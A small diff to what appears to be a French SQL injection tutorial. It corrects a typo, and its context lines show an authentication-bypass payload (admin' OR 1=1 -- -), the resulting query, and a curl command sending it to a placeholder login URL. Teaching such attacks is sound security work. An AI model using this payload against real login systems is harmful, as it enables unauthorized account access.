@@ -25,7 +25,7 @@ PASSWORD=ferrari
 Requète SQL obtenue:
 SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
 </code></pre>
-Envoyer les aparmètres avec Curl:
+Envoyer les paramètres avec Curl:
 <pre><code>curl http://target/login.pgp?login=admin' OR 1=1 -- -&password=ferrari
 </code></pre>
 "
